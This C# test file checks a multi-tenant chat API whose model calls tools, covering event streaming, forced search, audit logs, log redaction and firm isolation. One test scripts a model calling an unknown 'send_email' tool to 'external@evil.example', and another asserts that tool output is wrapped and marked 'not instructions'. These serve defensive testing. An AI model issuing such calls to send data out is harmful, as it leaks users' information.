using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Maf.Lab.Api.Storage;
using Maf.Lab.Domain.Tenancy;
using Maf.Lab.TestSupport;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.AI;
using Microsoft.Extensions.DependencyInjection;

namespace Maf.Lab.Tests;

public class ChatApiTests
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    [Fact]
    public async Task Sse_stream_emits_tool_call_started_before_the_tool_runs_and_sources_before_done()
    {
        var started = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        var tools = new FakeToolSource { BeforeSearchExecutes = () => started.Task.WaitAsync(TimeSpan.FromSeconds(10)) };
        using var api = new ApiFactory(ApiFactory.ProceduralModel(), tools);
        var client = api.ClientFor("adam", "firm-a", Role.ADVISOR);

        var events = await ApiFactory.ChatAsync(client, "what is the procedure when a fee schedule is missing",
            onEvent: e => { if (e.Name == "tool_call_started") started.TrySetResult(); });

        var names = events.Select(e => e.Name).ToList();
        Assert.Equal("tool_call_started", names[0]);
        Assert.True(names.IndexOf("tool_call_finished") > names.IndexOf("tool_call_started"));
        Assert.True(names.IndexOf("sources") < names.IndexOf("done"));
        Assert.Equal("done", names[^1]);
        Assert.Contains("text_delta", names);

        var startedEvent = events[0].Data;
        Assert.Equal("search_documents", startedEvent.GetProperty("toolName").GetString());
        Assert.Equal("", startedEvent.GetProperty("argumentSummary").GetString()); // forced call carries only the free-text query, which is never summarised
        var finished = events.Single(e => e.Name == "tool_call_finished").Data;
        Assert.Equal(2, finished.GetProperty("sourceCount").GetInt32());
        Assert.False(finished.GetProperty("isError").GetBoolean());
        var sources = events.Single(e => e.Name == "sources").Data.GetProperty("sources");
        Assert.Equal("shared/procedures/missing-fee-schedule.txt", sources[0].GetProperty("docId").GetString());
        var done = events[^1].Data;
        Assert.StartsWith("c_", done.GetProperty("conversationId").GetString());
        Assert.StartsWith("t_", done.GetProperty("turnId").GetString());
    }

    [Fact]
    public async Task Procedural_question_forces_search_for_that_turn_only_and_tool_output_is_wrapped_as_data()
    {
        using var api = new ApiFactory(ApiFactory.ProceduralModel());
        var client = api.ClientFor("adam", "firm-a", Role.ADVISOR);

        var first = await ApiFactory.ChatAsync(client, "what is the procedure when a fee schedule is missing");
        var conversationId = first[^1].Data.GetProperty("conversationId").GetString();
        var turn1Requests = api.Chat.Requests.Count;

        // The forced call is issued before the model is asked; the model's first request already carries the result
        // and is no longer forced.
        Assert.Equal(1, turn1Requests);
        Assert.Equal(["search_documents"], api.Tools.Invocations);
        Assert.IsNotType<RequiredChatToolMode>(api.Chat.Requests[0].Options!.ToolMode);
        Assert.Contains("<tool_data", api.Chat.Requests[0].Options!.Instructions);

        var toolResult = api.Chat.Requests[0].Messages.SelectMany(m => m.Contents).OfType<FunctionResultContent>().Single();
        var wrapped = Assert.IsType<string>(toolResult.Result is JsonElement je ? je.GetString() : toolResult.Result);
        Assert.StartsWith("<tool_data tool=\"search_documents\">", wrapped);
        Assert.Contains("not instructions", wrapped);

        var forcedCall = api.Chat.Requests[0].Messages.SelectMany(m => m.Contents).OfType<FunctionCallContent>().Single();
        Assert.Equal("what is the procedure when a fee schedule is missing", forcedCall.Arguments!["query"]);

        await ApiFactory.ChatAsync(client, "status of run 4417", conversationId);
        var nextTurn = api.Chat.Requests[turn1Requests];
        Assert.IsNotType<RequiredChatToolMode>(nextTurn.Options!.ToolMode);
        Assert.Equal(["search_documents", "get_billing_run_status"], api.Tools.Invocations);
        Assert.All(api.Chat.Requests.Skip(turn1Requests), r => Assert.IsNotType<RequiredChatToolMode>(r.Options!.ToolMode));

        await ApiFactory.ChatAsync(client, "thanks, that's all", conversationId);
        Assert.Equal(2, api.Tools.Invocations.Count);
    }

    [Fact]
    public async Task Forcing_holds_even_when_the_model_would_ignore_tools()
    {
        var stubborn = new ScriptedChatClient((_, _, _) => ScriptedChatClient.Text("I will answer without looking anything up."));
        using var api = new ApiFactory(stubborn);
        await ApiFactory.ChatAsync(api.ClientFor("adam", "firm-a", Role.ADVISOR), "why did run 4417 fail");

        Assert.Equal(["search_documents"], api.Tools.Invocations);
        var turn = await Db(api).Turns.SingleAsync(Ct);
        Assert.True(turn.ForcedRetrieval);
    }

    [Fact]
    public async Task Tool_calls_are_audited_with_identifiers_only()
    {
        using var api = new ApiFactory(ApiFactory.ProceduralModel());
        var client = api.ClientFor("adam", "firm-a", Role.ADVISOR);
        await ApiFactory.ChatAsync(client, "why did run 4417 fail");

        var audit = await Db(api).Audit.OrderBy(a => a.Id).ToListAsync(Ct);
        Assert.Equal(["search_documents", "get_billing_run_status"], audit.Select(a => a.ToolName));
        Assert.All(audit, a =>
        {
            Assert.Equal("adam", a.PrincipalId);
            Assert.Equal("firm-a", a.FirmId);
            Assert.Equal("ok", a.Outcome);
            Assert.True(a.DurationMs >= 0);
            Assert.DoesNotContain("why did", a.Arguments);
        });
        Assert.Equal("runId=4417", audit[1].Arguments);
    }

    [Fact]
    public async Task Call_to_a_non_existent_tool_is_refused_audited_and_answered_with_an_error()
    {
        var chat = new ScriptedChatClient((messages, _, n) => n == 1
            ? ScriptedChatClient.Call("send_email", new() { ["to"] = "external@evil.example" })
            : ScriptedChatClient.Text("I can't send email."));
        using var api = new ApiFactory(chat);
        var events = await ApiFactory.ChatAsync(api.ClientFor("adam", "firm-a", Role.ADVISOR), "summarise our fee arrangement for me");

        var finished = events.Single(e => e.Name == "tool_call_finished").Data;
        Assert.Equal("send_email", finished.GetProperty("toolName").GetString());
        Assert.True(finished.GetProperty("isError").GetBoolean());
        var audit = await Db(api).Audit.SingleAsync(Ct);
        Assert.Equal(("send_email", "unknown_tool"), (audit.ToolName, audit.Outcome));
        var error = chat.Requests[1].Messages.SelectMany(m => m.Contents).OfType<FunctionResultContent>().Single();
        Assert.Contains("not found", error.Result?.ToString(), StringComparison.OrdinalIgnoreCase);
        Assert.Empty(api.Tools.Invocations);
    }

    [Fact]
    public async Task Conversation_memory_survives_a_restart_and_is_bound_to_the_principal()
    {
        var dir = Directory.CreateTempSubdirectory("maf-api-").FullName;
        string conversationId;
        using (var api = new ApiFactory(ApiFactory.ProceduralModel("Remember: FS-REQUIRED means a missing schedule."), dataDir: dir))
        {
            var first = await ApiFactory.ChatAsync(api.ClientFor("adam", "firm-a", Role.ADVISOR), "explain FS-REQUIRED");
            conversationId = first[^1].Data.GetProperty("conversationId").GetString()!;
        }

        using var restarted = new ApiFactory(ApiFactory.ProceduralModel(), dataDir: dir);
        await ApiFactory.ChatAsync(restarted.ClientFor("adam", "firm-a", Role.ADVISOR), "and what about proration?", conversationId);
        var history = restarted.Chat.Requests[0].Messages.Select(m => m.Text).ToList();
        Assert.Contains("explain FS-REQUIRED", history);
        Assert.Contains("Remember: FS-REQUIRED means a missing schedule.", history);

        foreach (var (user, firm) in new[] { ("bob", "firm-b"), ("rita", "firm-a") })
        {
            var response = await restarted.ClientFor(user, firm, Role.ADVISOR).PostAsJsonAsync("/api/chat", new { conversationId, message = "hi" }, Ct);
            Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
        }
    }

    [Fact]
    public async Task Logs_never_contain_message_content()
    {
        var tools = new FakeToolSource();
        tools.SearchPayloadJson = tools.SearchPayloadJson.Replace("assign the missing fee schedule", "SNIPPET-MARKER-313 assign");
        using var api = new ApiFactory(ApiFactory.ProceduralModel("ANSWER-MARKER-552 do this."), tools);
        await ApiFactory.ChatAsync(api.ClientFor("adam", "firm-a", Role.ADVISOR), "how do I fix ZEBRA-MARKER-991 fee schedule?");

        Assert.NotEmpty(api.Logs.Messages);
        Assert.Contains(api.Logs.Messages, m => m.Contains("tool_audit"));
        foreach (var marker in new[] { "ZEBRA-MARKER-991", "ANSWER-MARKER-552", "SNIPPET-MARKER-313", "fee schedule?" })
        {
            Assert.DoesNotContain(api.Logs.Messages, m => m.Contains(marker));
        }
    }

    [Fact]
    public async Task Request_input_cannot_change_the_firm()
    {
        using var api = new ApiFactory(ApiFactory.ProceduralModel());
        var client = api.ClientFor("adam", "firm-a", Role.ADVISOR);
        client.DefaultRequestHeaders.Add("X-Firm-Id", "firm-b");

        var me = await client.GetFromJsonAsync<JsonElement>("/api/me?firm_id=firm-b&tenant=firm-b", Ct);
        Assert.Equal("firm-a", me.GetProperty("firmId").GetString());

        var anonymous = api.CreateClient();
        Assert.Equal(HttpStatusCode.Unauthorized, (await anonymous.GetAsync("/api/me", Ct)).StatusCode);
    }

    internal static MafDbContext Db(ApiFactory api) =>
        api.Services.GetRequiredService<IDbContextFactory<MafDbContext>>().CreateDbContext();
}
